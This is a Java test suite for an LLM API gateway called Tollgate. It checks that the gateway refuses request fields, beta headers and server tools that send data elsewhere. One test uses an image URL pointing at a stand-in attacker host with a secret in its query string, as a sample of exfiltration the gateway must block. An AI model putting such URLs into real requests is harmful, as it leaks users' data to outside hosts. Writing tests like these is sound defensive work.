package io.github.jamalakhras.tollgate.server.gateway;

import static org.assertj.core.api.Assertions.assertThat;

import io.github.jamalakhras.tollgate.core.audit.Intent;
import io.github.jamalakhras.tollgate.core.policy.Decision;
import io.github.jamalakhras.tollgate.core.policy.GuardStep;
import io.github.jamalakhras.tollgate.core.policy.Refusal;
import io.github.jamalakhras.tollgate.providers.FakeProvider;
import java.net.http.HttpResponse;
import org.junit.jupiter.api.Test;

class RequestFeaturesTest extends GatewayTestSupport {

    private static final String OK = "{\"id\":\"1\",\"choices\":[]}";

    private HttpResponse<String> chat(String fields) throws Exception {
        return post(
                Endpoints.OPENAI_CHAT,
                "{\"model\":\"qwen3\"," + fields + "}",
                "Authorization",
                "Bearer " + KEY.value());
    }

    @Test
    void refusesAFieldThatSendsDataElsewhereAndAuditsTheRefusal() throws Exception {
        HttpResponse<String> response = chat("\"messages\":[],\"web_search_options\":{}");

        assertThat(response.statusCode()).isEqualTo(403);
        assertThat(response.body())
                .contains("\"code\":\"policy_denied\"")
                .contains("The field 'web_search_options' is not allowed: it sends searches to a search engine");
        assertThat(PROVIDER.received()).isEmpty();
        Intent intent = (Intent) auditRecordsOf(response).getFirst();
        assertThat(intent.decision())
                .isEqualTo(Decision.deny(
                        Refusal.POLICY_DENIED,
                        "The field 'web_search_options' is not allowed: it sends searches to a search engine"));
        assertThat(intent.steps()).extracting(GuardStep::guard).containsExactly("request-features");
    }

    @Test
    void refusesFieldsItHasNotReviewed() throws Exception {
        HttpResponse<String> response = chat("\"messages\":[],\"prediction\":{}");

        assertThat(response.statusCode()).isEqualTo(403);
        assertThat(response.body()).contains("The field 'prediction' is not one Tollgate has reviewed");
    }

    @Test
    void refusesImagesByUrlButForwardsInlineImages() throws Exception {
        PROVIDER.respond(200, OK);

        HttpResponse<String> remote = chat("\"messages\":[{\"role\":\"user\",\"content\":[{\"type\":\"image_url\","
                + "\"image_url\":{\"url\":\"https://attacker.example/?d=secret\"}}]}]");
        HttpResponse<String> inline = chat("\"messages\":[{\"role\":\"user\",\"content\":[{\"type\":\"image_url\","
                + "\"image_url\":{\"url\":\"data:image/png;base64,AA\"}}]}]");

        assertThat(remote.statusCode()).isEqualTo(403);
        assertThat(remote.body())
                .contains(
                        "This request uses images by URL, which this policy does not allow for data class 'internal'");
        assertThat(inline.statusCode()).isEqualTo(200);
        assertThat(PROVIDER.received()).hasSize(1);
    }

    @Test
    void refusesBetaHeadersInTheAnthropicFormat() throws Exception {
        HttpResponse<String> response = post(
                Endpoints.ANTHROPIC_MESSAGES,
                "{\"model\":\"claude-sonnet\",\"max_tokens\":64,\"messages\":[]}",
                "x-api-key",
                KEY.value(),
                "anthropic-beta",
                "mcp-client-2025-11-20");

        assertThat(response.statusCode()).isEqualTo(403);
        assertThat(response.body())
                .contains("\"type\":\"permission_error\"")
                .contains("The anthropic-beta 'mcp-client-2025-11-20' is not allowed");
        assertThat(PROVIDER.received()).isEmpty();
    }

    @Test
    void forwardsUnreviewedFieldsAndBetasWhereThePolicyAllowsThem() throws Exception {
        PROVIDER.respond(200, "{\"id\":\"msg_1\",\"type\":\"message\",\"content\":[]}");

        HttpResponse<String> response = post(
                Endpoints.ANTHROPIC_MESSAGES,
                "{\"model\":\"claude-sonnet\",\"max_tokens\":64,\"messages\":[],\"context_management\":{}}",
                "x-api-key",
                CODER_KEY.value(),
                "anthropic-beta",
                "interleaved-thinking-2025-05-14");

        assertThat(response.statusCode()).isEqualTo(200);
        FakeProvider.Received forwarded = PROVIDER.received().getFirst();
        assertThat(forwarded.headers().get("Anthropic-beta")).containsExactly("interleaved-thinking-2025-05-14");
        assertThat(forwarded.body()).contains("\"context_management\":{}");
    }

    @Test
    void stillRefusesWhatNoPolicyCanAllow() throws Exception {
        HttpResponse<String> response = post(
                Endpoints.ANTHROPIC_MESSAGES,
                "{\"model\":\"claude-sonnet\",\"max_tokens\":64,\"messages\":[]}",
                "x-api-key",
                CODER_KEY.value(),
                "anthropic-beta",
                "web-fetch-2025-09-10");

        assertThat(response.statusCode()).isEqualTo(403);
        assertThat(PROVIDER.received()).isEmpty();
    }

    @Test
    void allowsAFeatureOnlyForTheDataClassesThePolicyNames() throws Exception {
        PROVIDER.respond(200, OK);
        String remoteImage = "{\"model\":\"qwen3\",\"messages\":[{\"role\":\"user\",\"content\":[{\"type\":"
                + "\"image_url\",\"image_url\":{\"url\":\"https://example.com/chart.png\"}}]}]}";

        HttpResponse<String> internal =
                post(Endpoints.OPENAI_CHAT, remoteImage, "Authorization", "Bearer " + CODER_KEY.value());
        HttpResponse<String> confidential = post(
                Endpoints.OPENAI_CHAT,
                remoteImage,
                "Authorization",
                "Bearer " + CODER_KEY.value(),
                Gateway.DATA_CLASS_HEADER,
                "confidential");

        assertThat(internal.statusCode()).isEqualTo(200);
        assertThat(confidential.statusCode()).isEqualTo(403);
        assertThat(confidential.body()).contains("not allow for data class 'confidential'");
    }

    @Test
    void refusesServerToolsButForwardsClientTools() throws Exception {
        PROVIDER.respond(200, "{\"id\":\"msg_1\",\"type\":\"message\",\"content\":[]}");
        String request = "{\"model\":\"claude-sonnet\",\"max_tokens\":64,\"messages\":[],\"tools\":[%s]}";

        HttpResponse<String> server = post(
                Endpoints.ANTHROPIC_MESSAGES,
                request.formatted("{\"type\":\"web_fetch_20250910\",\"name\":\"web_fetch\"}"),
                "x-api-key",
                KEY.value());
        HttpResponse<String> client = post(
                Endpoints.ANTHROPIC_MESSAGES,
                request.formatted("{\"name\":\"emit\",\"input_schema\":{}}"),
                "x-api-key",
                KEY.value());

        assertThat(server.statusCode()).isEqualTo(403);
        assertThat(server.body()).contains("The tool type 'web_fetch_20250910' is not allowed");
        assertThat(client.statusCode()).isEqualTo(200);
    }
}
